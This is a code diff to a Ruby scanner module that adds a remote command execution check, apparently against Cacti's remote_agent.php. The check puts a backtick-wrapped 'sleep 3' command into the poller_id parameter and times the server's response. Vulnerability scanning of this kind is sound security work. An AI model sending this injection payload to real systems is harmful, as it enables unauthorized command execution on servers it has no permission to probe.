@@ -1,6 +1,3 @@
-# encoding: utf-8
-require 'uri'
-require "unicode_normalize/normalize.rb"
 class RBModule_cati_front_rce
     def initialize
     end
@@ -17,14 +14,18 @@ class RBModule_cati_front_rce
             return 
         end
 
-        url = scheme + "://" + uri["host"] + uri["path"] + "?lang="
-        
-        
+        url = scheme + "://" + "#{uri["host"]}:#{uri["port"]}" + "/remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`sleep+3`"
+        info("Send url:#{url}")
+        before = Time.now.strftime("%s%L").to_i
+        resp = Request.get(url, headers={"host"=>uri["host"],"Connection"=>"close"})
+        after = Time.now.strftime("%s%L").to_i
+        info("Cati cost time: #{after - before} ms, vulntest")
+        puts resp.inspect
     end
 
     def passive_run(index)
         log = HistoryLog.get_req index
-        url = log['url']
+        url = log.url
         uri = UriParser.parse(url)
         info("Test url: #{uri}")
         scan(uri)
